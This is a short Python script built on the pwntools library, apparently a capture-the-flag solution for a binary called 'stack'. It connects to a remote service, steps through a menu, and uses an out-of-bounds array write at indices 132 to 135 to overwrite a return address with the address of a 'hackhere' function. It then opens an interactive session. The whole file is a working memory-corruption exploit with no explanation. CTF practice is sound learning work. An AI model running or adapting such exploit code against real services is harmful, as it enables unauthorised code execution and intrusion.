#!/usr/bin/python 
from pwn import *

def option3(index, value):
    io.recvuntil("5. exit\n")
    io.sendline("3")
    io.recvuntil("isccc ccssii ii sccisc:\n")
    io.sendline(str(index))
    io.recvuntil("iii isccsc:\n")
    io.sendline(str(value))

# context(arch="i386", os="linux", log_level="debug")

# io = process("./stack")
io = remote("192.168.33.59", 8000)

# padding
io.recvuntil("isc iscc isccisc iii isccc\n")
io.sendline("1")
io.recvuntil("iscc cc iscc isciscs\n")
io.sendline("1")

hackhere = 0x804859b

for i in range(4):
    option3(i+132, (hackhere >> (i*8))&0xff)

io.recvuntil("5. exit\n")
io.sendline("5")

io.interactive();
